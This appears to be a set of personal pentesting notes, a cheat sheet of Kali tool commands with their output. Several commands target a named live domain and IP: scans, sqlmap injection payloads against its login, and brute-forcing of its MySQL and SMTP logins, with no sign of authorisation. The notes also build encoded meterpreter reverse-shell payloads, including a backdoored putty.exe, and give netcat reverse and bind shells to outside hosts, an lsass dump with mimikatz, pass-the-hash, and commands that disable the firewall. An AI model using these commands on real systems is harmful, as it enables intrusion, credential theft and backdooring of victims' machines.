    [*]      MX mail.northernrich.com 150.107.31.61
    [*]      CNAME www.northernrich.com northernrich.com
    [*]      A northernrich.com 150.107.31.61
    [*]      TXT www.northernrich.com v=spf1 a mx ip4:150.107.31.61 ~all
    [*] Enumerating SRV Records
    [+] 0 Records Found
    [*] Saving records to XML file: /home/kali/Desktop/work/dnsrecon-northernrich.xml


    2) nmap

    3) amap
    ...    
    amap v5.4 (www.thc.org/thc-amap) started at 2022-07-01 11:21:02 - APPLICATION MAPPING mode

    Total amount of tasks to perform in plain connect mode: 23
    DEBUG: probing now trigger http (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ssl (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-remote-desktop-protocol (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (3) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger netbios-session (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-ds (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger smtp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ftp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger rpc (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger dns (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ldap (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger oracle-tns-listener (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger x-windows (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger sap-r3 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger ms-sql (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jrmi (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger nessus (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger webmin (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger db2 (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger jinilookupservice (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger slp (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger tivoli_tsm-server (1) on 150.107.31.61:443/tcp
    DEBUG: probing now trigger norman-njeeves (1) on 150.107.31.61:443/tcp
    Waiting for timeout on 23 connections ...
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http
    Protocol on 150.107.31.61:443/tcp (by trigger http) matches http-apache-2
    Protocol on 150.107.31.61:443/tcp (by trigger ssl) matches ssl


    4) masscan -> scan the internet! Literally, you can scan the whole internet if you have time...
    
    root@kali:~# masscan -p22,80,445 192.168.1.0/24

    Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2014-05-13 21:35:12 GMT
     -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
    Initiating SYN Stealth Scan
    Scanning 256 hosts [3 ports/host]
    Discovered open port 22/tcp on 192.168.1.217
    Discovered open port 445/tcp on 192.168.1.220
    Discovered open port 80/tcp on 192.168.1.230
    
# Vulnerability scan:

    1) CVE,CPE,CVSS -> https://cve.mitre.org/

    2) nmap 

    3) nessus
    
    sudo systemctl start nessusd && systemctl --no-pager status nessusd
    
    > sudo systemctl status nessusd

    ● nessusd.service - The Nessus Vulnerability Scanner
         Loaded: loaded (/lib/systemd/system/nessusd.service; disabled; vendor preset: disabled)
         Active: active (running) since Fri 2022-07-01 12:41:42 CEST; 3min 20s ago
       Main PID: 27467 (nessus-service)
          Tasks: 15 (limit: 4589)
         Memory: 1.0G
            CPU: 20.892s
         CGroup: /system.slice/nessusd.service
                 ├─27467 /opt/nessus/sbin/nessus-service -q
                 └─27469 nessusd -q

    Jul 01 12:41:42 kali systemd[1]: Started The Nessus Vulnerability Scanner.
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 67msec
    Jul 01 12:41:55 kali nessus-service[27469]: Cached 240 plugin libs in 45msec

    Then, you can go the app using this url, in my machine. Maybe you have to change that url for https://localhost:8834/#/
    
    https://kali:8834/#/scans/folders/my-scans
    
    Dont you remember user and password?
    
    https://docs.tenable.com/nessus/commandlinereference/Content/ChangeAUsersPassword.htm
    
    sudo systemctl stop nessusd

# Exploitation and hacking of hosts

    1) metasploit -> THE framework to hack and exploit.
    
    I did a scanning session, but it is too long, so i created a gist.
    
    https://gist.github.com/alonsoir/65a703f44ccbbfa7f1ef57c49e86b8de
    
    https://www.kali.org/tools/metasploit-framework/
    
    https://www.offensive-security.com/metasploit-unleashed/
    
    2) msfvenom -> Payload Generator and Encoder
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f vbs > example.vbs
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of vbs file: 7414 bytes
    > ls example.vbs
    example.vbs
    
    # Basically this commands creates a reverse_tcp windows exe app with your ip and port...
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe > example.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 73802 bytes
    > ls example.exe
    example.exe
    
    # run this command to see output formats... 
    > msfvenom --list formats

    # I can create a custom version of whatever exe file, in this case, putty.exe 
    
    > msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.85.139 LPORT=33534 -i 20  -e x86/shikata_ga_nai -a x86 --platform windows -f exe -x /home/kali/Downloads/putty.exe -o putty-fake.exe
    Found 1 compatible encoders
    Attempting to encode payload with 20 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 381 (iteration=0)
    x86/shikata_ga_nai succeeded with size 408 (iteration=1)
    x86/shikata_ga_nai succeeded with size 435 (iteration=2)
    x86/shikata_ga_nai succeeded with size 462 (iteration=3)
    x86/shikata_ga_nai succeeded with size 489 (iteration=4)
    x86/shikata_ga_nai succeeded with size 516 (iteration=5)
    x86/shikata_ga_nai succeeded with size 543 (iteration=6)
    x86/shikata_ga_nai succeeded with size 570 (iteration=7)
    x86/shikata_ga_nai succeeded with size 597 (iteration=8)
    x86/shikata_ga_nai succeeded with size 624 (iteration=9)
    x86/shikata_ga_nai succeeded with size 651 (iteration=10)
    x86/shikata_ga_nai succeeded with size 678 (iteration=11)
    x86/shikata_ga_nai succeeded with size 705 (iteration=12)
    x86/shikata_ga_nai succeeded with size 732 (iteration=13)
    x86/shikata_ga_nai succeeded with size 759 (iteration=14)
    x86/shikata_ga_nai succeeded with size 786 (iteration=15)
    x86/shikata_ga_nai succeeded with size 813 (iteration=16)
    x86/shikata_ga_nai succeeded with size 840 (iteration=17)
    x86/shikata_ga_nai succeeded with size 867 (iteration=18)
    x86/shikata_ga_nai succeeded with size 894 (iteration=19)
    x86/shikata_ga_nai chosen with final size 894
    Payload size: 894 bytes
    Final size of exe file: 1449256 bytes
    Saved as: putty-fake.exe
    > ls -tatlh putty-fake.exe
    -rw-r--r-- 1 kali kali 1.4M Jul  1 13:37 putty-fake.exe

    3) pesidious -> weird, now i cannot run it...  https://github.com/CyberForce/Pesidious/issues/8

    https://kalilinuxtutorials.com/pesidious/
    
    quick install commands.
    
    > conda create -n py36 python=3.6 ipykernel
    > conda activate py36
    > python --version
    Python 3.6.13 :: Anaconda, Inc.
    > pip install pip==8.1.1
    > pip install -r pip_requirements/requirements.txt
    python classifier.py -d /path/to/directory/with/malware/files
    python mutate.py -d /path/to/directory/with/malware/files

    4) armitage
    
    Web interface for metasploit
    
    quick commands:
    
        msfdb init
        armitage

    https://localhost:5443/api/v1/auth/account
    
    https://www.dragonjar.org/manual-de-armitage-en-espanol.xhtml
    
    https://www.kali.org/tools/armitage/

# Exploitation and hacking of websites -> You have to see this again.

    1) Burp Suite -> 

    2) SQLInjection

    3) inyeccion de código

    4) sqlMap
    
    Use Burp Suite to generate a txt file with POST request, then run this command:
    
    sqlmap -r post-petition.txt -p username -p password

    https://hackertarget.com/sqlmap-post-request-injection/
    
    https://hackertarget.com/sqlmap-tutorial/
    
    After some minutes, you have this:
    
    ...
    POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
    sqlmap identified the following injection point(s) with a total of 504 HTTP(s) requests:
    ---
    Parameter: password (POST)
        Type: boolean-based blind
        Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' OR NOT 4956=4956#

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND GTID_SUBSET(CONCAT(0x71706a7871,(SELECT (ELT(1193=1193,1))),0x7178707871),1193)-- pBsa

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: action=LoginAdmin&username=" or 1==1 -- canario&password=pass' AND (SELECT 7242 FROM (SELECT(SLEEP(5)))dLML)-- bxut
    ---
    [17:33:50] [INFO] the back-end DBMS is MySQL
    [17:33:51] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
    web server operating system: Linux Debian
    web application technology: Apache 2.4.51, PHP 5.6.40
    back-end DBMS: MySQL >= 5.6
    [17:33:53] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/www.northernrich.com'


    5) path Traversal

    6) webshells

    7) file upload

    8) html injection y XSS

    9) CSRF

    10) XSstrike

    11) Cookie tampering, command injection

# Exploitation and hacking of network vulnerabilities

    1) MITM

    2) Bettercap

    3) ARP Spoofing

    4) DNS Spoofing

    5) Social engineering toolkit

    6) Polymorph. Manipulation of network traffic in real time and programmable. Black magic!

# Post-exploitation techniques

    1) meterpreter en metasploit

    2) Mimicatz

    3) UAC bypass

    4) procdump y lsass.exe

    5) backdoors en binarios con msfvenom

    6) Password cracking in hashed form with John the ripper and hashcat

    7) session migration using the backdoor.

# Machine learning applied to cybersecurity

    1) Batting, reconnaissance of hosts based on their impact

    2) pesidous, mutating backdoors using the one created by msfVenom.

    3) Deep fakes.

# Mitre&Attck

# Decompiling techniques (black magic)

    GHidra -> in Kali 
    IDA -> /opt/idafree-7.7 ./ida64

# Apply the best nmap scanning strategy for all size networks

# Host discovery, generate a list of surviving hosts

    cd /home/kali/Desktop/work
    sudo nmap -sn -T4 -oG Discovery.gnmap 192.168.1.1/24
    grep "Status: Up" Discovery.gnmap | cut -f 2 -d ' ' > LiveHosts.txt
    
    #http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf

    sudo nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt
    sudo nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt

# Port found, found all the ports, but UDP port scanning will be very slow

    sudo nmap -sS -T4 -Pn –top-ports 3674 -oG LiveHost-port-3674 -iL LiveHosts.txt
    sudo nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt
    # este comando es super lento...
    sudo nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt

# Displays the TCP / UDP port

    grep "open" FullTCP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "TCP-PORTS: " $0}'
    grep "open" FullUDP | cut -f 1 -d '' | sort -nu | cut -f 1 -d '/' | xargs | sed 's/ /,/g' | awk '{print "UDP-PORTS: " $0}'

# Detect the service version

    sudo nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt
    sudo nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt
    sudo nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt
    # Este comando hace un TCP y UDP scan, udp ports 53,111,137. tcp ports 21-25,80,139,8080. El anterior hace lo mismo pero da warnings.
    sudo nmap -O -sV -sS -sU -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt 

# Nmap to avoid the firewall

# Segmentation
    nmap -f
# Modify the default MTU size, but it must be a multiple of 8 (8, 16, 24, 32, etc.)
    nmap –mtu 24
# Generate random numbers of spoofing
    nmap -D RND:10 [target]
# Manually specify the IP to be spoofed
    nmap -D decoy1,decoy2,decoy3 etc.
# Botnet scanning, first need to find the botnet IP
    nmap -sI [Zombie IP] [Target IP]
# Designated source terminal
    nmap –source-port 80 IP
# Add a random number of data after each scan
    nmap –data-length 25 IP
# MAC address spoofing, you can generate different host MAC address
    nmap –spoof-mac Dell/Apple/3Com IP

# Nmap for Web vulnerability scanning

    cd /usr/share/nmap/scripts/
    wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site www.northernrich.com 
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-1 --script-args vulscandb=scipvuldb.csv www.northernrich.com
    sudo nmap -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-port80 --script-args vulscandb=scipvuldb.csv -p80 www.northernrich.com
    sudo nmap -PN -sS -sV --script=vulscan/vulscan.nse -oG northernrich-vulscan-site-vulscancorrelation-1 --script-args vulscancorrelation=1 -p80 www.northernrich.com
    sudo nmap -sV -oG northernrich-vulscan-site-script-vuln --script=vuln www.northernrich.com
    sudo nmap -PN -sS -sV -oG northernrich-vulscan-site-script-all --script=all --script-args vulscancorrelation=1 www.northernrich.com

# Web path scanner
    dirsearch -> 
    
    designed to brute force directories and files in webservers.

    As a feature-rich tool, dirsearch gives users the opportunity to perform a complex web content discovering, with many vectors for the wordlist, high     accuracy, impressive performance, advanced connection/request settings, modern brute-force techniques and nice output.

    https://www.kali.org/tools/dirsearch/
    
    > python --version
    Python 3.9.12
    > dirsearch --url=https://www.northernrich.com/en/ --wordlists /usr/share/seclists/Discovery/Web-Content/dirsearch.txt

      _|. _ _  _  _  _ _|_    v0.4.2
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 29583

    Output File: /home/kali/.dirsearch/reports/www.northernrich.com/-en-_22-07-04_18-42-46.txt

    Error Log: /home/kali/.dirsearch/logs/errors-22-07-04_18-42-46.log

    Target: https://www.northernrich.com/en/

    [18:42:47] Starting: 
    [18:42:59] 403 -    2KB - /en/.php                                         
    [18:42:59] 200 -   19KB - /en/.                                            
    [18:42:59] 403 -    2KB - /en/.html                                        
    [18:43:12] 403 -    2KB - /en/.htaccess.bak1                               
    [18:43:13] 403 -    2KB - /en/.htaccess.orig                               
    [18:43:13] 403 -    2KB - /en/.htaccess.save
    [18:43:13] 403 -    2KB - /en/.htaccessBAK
    [18:43:13] 403 -    2KB - /en/.htm
    [18:43:13] 403 -    2KB - /en/.htaccessOLD                                 
    [18:43:13] 403 -    2KB - /en/.httr-oauth
    [18:43:13] 403 -    2KB - /en/.htaccess.sample                             
    [18:43:14] 403 -    2KB - /en/.htaccessOLD2                                
    [18:43:21] 403 -    2KB - /en/.php3                                        
    [18:51:45] 200 -   19KB - /en/index.html                                    
    [18:56:05] 200 -   36KB - /en/register.php                                  

    Task Completed 
    
    DirBuster -> Like above, but with a gui
    
    https://www.kali.org/tools/dirbuster/#dirbuster-1
    
    Patator- password guessing attacks

    git clone https://github.com/lanjelot/patator.git /usr/share/patator
    #Probably you will have available the tool in kali...
    # Passwords and users from SecList. /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
    
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt host=150.107.31.61 -x ignore:fgrep='Access denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator mysql_login user=root password=FILE0 0=/usr/share/john/password.lst host=150.107.31.61 -x ignore:fgrep='Acess denied for user'
    sudo patator smtp_login host=150.107.31.61 user=Ololena password=FILE0 0=/usr/share/john/password.lst
    sudo patator smtp_login host=150.107.31.61 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
    sudo patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’

# Use Fierce to brute DNS

# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server. Esto tengo que ejecutarlo. Pendiente!

    # http://ha.ckers.org/fierce/
    https://github.com/mschwager/fierce
    
    ./fierce.pl -dns example.com
    ./fierce.pl –dns example.com –wordlist myWordList.txt

# Use Nikto to scan Web services

    nikto -C all -h http://IP
    nikto -C all -h 150.107.31.61
    
    > nikto -C all -h https://www.northernrich.com/en/
    - Nikto v2.1.6
    ---------------------------------------------------------------------------
    + Target IP:          150.107.31.61
    + Target Hostname:    www.northernrich.com
    + Target Port:        443
    ---------------------------------------------------------------------------
    + SSL Info:        Subject:  /CN=northernrich.com
                       Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                       Issuer:   /C=US/O=Let's Encrypt/CN=R3
    + Start Time:         2022-07-04 18:57:36 (GMT2)
    ---------------------------------------------------------------------------
    + Server: Apache/2.4.51 (Debian)
    + The anti-clickjacking X-Frame-Options header is not present.
    + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect aga
    + The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
    + The site uses SSL and Expect-CT header is not present.
    + The X-Content-Type-Options header is not set. This could allow the user agent to render the conte
    + Retrieved x-powered-by header: PHP/5.6.40-0+deb8u12
    + Hostname 'www.northernrich.com' does not match certificate's names: northernrich.com
    + ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5157.
    : Connection refused
    + SCAN TERMINATED:  20 error(s) and 7 item(s) reported on remote host
    + End Time:           2022-07-04 19:08:02 (GMT2) (626 seconds)
    ---------------------------------------------------------------------------
    + 1 host(s) teste
    
# WordPress scan Está en kali por defecto.
    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
    ./wpscan --url https://www.northernrich.com/en/ –enumerate p

# HTTP fingerprint identification

    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
    cd httprint_301/linux/
    ./httprint -h http://IP -s signatures.txt
    
    https://www.kali.org/tools/httprint/#httprint-1
    
# Scan with dirb

    Scan the web server (http://192.168.1.224/) for directories using a dictionary file (/usr/share/wordlists/dirb/common.txt)
        
    > dirb https://www.northernrich.com /usr/share/dirb/wordlists/common.txt

    -----------------
    DIRB v2.22    
    By The Dark Raver
    -----------------

    START_TIME: Mon Jul  4 19:09:50 2022
    URL_BASE: https://www.northernrich.com/
    WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

    -----------------

    GENERATED WORDS: 4612                                                          

    ---- Scanning URL: https://www.northernrich.com/ ----
    ==> DIRECTORY: https://www.northernrich.com/admin/                                                
    ==> DIRECTORY: https://www.northernrich.com/api/                                                  
    ==> DIRECTORY: https://www.northernrich.com/assets/                                               
    ==> DIRECTORY: https://www.northernrich.com/backup/                                               
    --> Testing: https://www.northernrich.com/emoticons                                               
    --> Testing: https://www.northernrich.com/employee         
    ...
    
# Scan with Skipfish

# Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.

    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
    
    https://www.kali.org/tools/skipfish/#skipfish-1
    
    > skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o skipfish-northern -u https://www.northernrich.com/en/
    skipfish web application scanner - version 2.10b
    [*] Scan in progress, please stay tuned...

    [+] Copying static resources...                                                                                                                                                                           
    [+] Sorting and annotating crawl nodes: 19                                                                                                                                                                
    [+] Looking for duplicate entries: 19                                                                                                                                                                     
    [+] Counting unique nodes: 12                                                                                                                                                                             
    [+] Saving pivot data for third-party tools...                                                                                                                                                            
    [+] Writing scan description...                                                                                                                                                                           
    [+] Writing crawl tree: 19                                                                                                                                                                                
    [+] Generating summary views...                                                                                                                                                                           
    [+] Report saved to 'skipfish-northern/index.html' [0x1e08a1da].                                                                                                                                          
    [+] This was a great day for science!   

# Use the NC scan

    nc -v -w 1 target -z 1-1000
    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

# Unicornscan

# NOTE: Unicornscan is a tool for information gathering and security audits. como si hicieras nmap -p- --open
    
    https://www.kali.org/tools/unicornscan/
    
    sudo us -mTsf -Iv -r 1000 150.107.31.61:a
    
    sudo us -H -msf -Iv 150.107.31.61 -p 1-65535
    ...
    listener statistics 136150 packets recieved 0 packets droped and 0 interface drops
    TCP open                     ftp[   21]         from ns21.appservhosting.com  ttl 128 
    TCP open                     ssh[   22]         from ns21.appservhosting.com  ttl 128 
    TCP open                    smtp[   25]         from ns21.appservhosting.com  ttl 128 
    TCP open                  domain[   53]         from ns21.appservhosting.com  ttl 128 
    TCP open                    http[   80]         from ns21.appservhosting.com  ttl 128 
    TCP open                    pop3[  110]         from ns21.appservhosting.com  ttl 128 
    TCP open                  sunrpc[  111]         from ns21.appservhosting.com  ttl 128 
    TCP open                    imap[  143]         from ns21.appservhosting.com  ttl 128 
    TCP open                   https[  443]         from ns21.appservhosting.com  ttl 128 
    TCP open                     urd[  465]         from ns21.appservhosting.com  ttl 128 
    TCP open              submission[  587]         from ns21.appservhosting.com  ttl 128 
    TCP open                    ftps[  990]         from ns21.appservhosting.com  ttl 128 
    TCP open                   imaps[  993]         from ns21.appservhosting.com  ttl 128 
    TCP open                   pop3s[  995]         from ns21.appservhosting.com  ttl 128 
    TCP open                servexec[ 2021]         from ns21.appservhosting.com  ttl 128 
    TCP open                    down[ 2022]         from ns21.appservhosting.com  ttl 128 
    TCP open           scientia-ssdb[ 2121]         from ns21.appservhosting.com  ttl 128
    
    > sudo us -H -mU -Iv 150.107.31.61 -p 1-65535
    adding 150.107.31.61/32 mode `UDPscan' ports `1-65535' pps 300
    using interface(s) eth0
    scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
    UDP open 192.168.1.49:56700  ttl 128
    UDP open 192.168.85.2:53  ttl 128
    sender statistics 298.6 pps with 65544 packets sent total
    listener statistics 80 packets recieved 0 packets droped and 0 interface drops
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                  domain[   53]         from 192.168.85.2  ttl 128 
    Main [Error   standard_dns.c:104] getnameinfo fails: Temporary failure in name resolution [-3]
    UDP open                 unknown[56700]         from 192.168.1.49  ttl 128
    
# Use Xprobe2 to identify the operating system fingerprint

    A Remote active operating system fingerprinting tool.

    sudo xprobe2  -v -r -p tcp:80:open 150.107.31.61

    I can generate a signature.txt file, maybe you can use it with httprint.
    
    sudo xprobe2  -v -r  -F -o /home/kali/Desktop/signature-northernrich.txt  -p tcp:443:open -p tcp:80:open -B 150.107.31.61


    Enumeration of Samba

    nmblookup -A target
    smbclient //MOUNT/share -I target -N
    rpcclient -U “” target
    enum4linux target

# Enumerates SNMP

    snmpget -v 1 -c public IP
    snmpwalk -v 1 -c public IP
    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

# Useful Windows cmd command

    net localgroup Users
    net localgroup Administrators
    search dir/s *.doc
    system(“start cmd.exe /k $cmd”)
    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64

# PuTTY connects the tunnel

    Forward the remote port to the destination address
    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP

# Meterpreter port forwarding

    https://www.offensive-security.com/metasploit-unleashed/portfwd/
    
# Forward the remote port to the destination address
    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
    kali > rdesktop 127.0.0.1:3389

# Enable the RDP service

    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
    netsh firewall set service remoteadmin enable
    netsh firewall set service remotedesktop enable

# Close Windows Firewall
    netsh firewall set opmode disable

Meterpreter VNC/RDP

    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
    run getgui -u admin -p 1234
    run vnc -p 5043

# Use Mimikatz

    Gets the Windows plaintext user name password

    git clone https://github.com/gentilkiwi/mimikatz.git
    mimikatz privilege::debug
    mimikatz sekurlsa::logonPasswords full

Gets a hash value

    git clone https://github.com/byt3bl33d3r/pth-toolkit
    pth-winexe -U hash //IP cmd

    or

    apt-get install freerdp-x11
    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

    or
    
    meterpreter > run post/windows/gather/hashdump
    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
    msf exploit(psexec) > exploit
    meterpreter > shell
    
# Use Hashcat to crack passwords    

    hashcat -m 400 -a 0 hash /root/rockyou.txt
    
    https://www.securityartwork.es/2017/02/15/cracking-contrasenas-hashcat/
    
    https://sniferl4bs.com/showcase/
    
    
# Use the NC to fetch Banner information

    nc 150.107.31.61 80
    GET / HTTP/1.1
    Host: 192.168.0.10
    User-Agent: Mozilla/4.0
    Referrer: www.example.com
    <enter>
    <enter>


# Use NC to bounce the shell on Windows

    c:>nc -Lp 31337 -vv -e cmd.exe
    nc 192.168.0.10 31337
    c:>nc example.com 80 -e cmd.exe
    nc -lp 80

    nc -lp 31337 -e /bin/bash
    nc 192.168.0.10 31337
    nc -vv -r(random) -w(wait) 1 150.107.31.61 -z(i/o error) 1-1000

# Look for the SUID/SGID root file

# Locate the SUID root file
    
    sudo find / -user root -perm -4000 -print

# Locate the SGID root file:

    sudo find / -group root -perm -2000 -print

# Locate the SUID and SGID files:

    sudo find / -perm -4000 -o -perm -2000 -print

# Find files that do not belong to any user:

    sudo find / -nouser -print

# Locate a file that does not belong to any user group:

    sudo find / -nogroup -print

# Find soft links and point to:

    find / -type l -ls

# Python shell

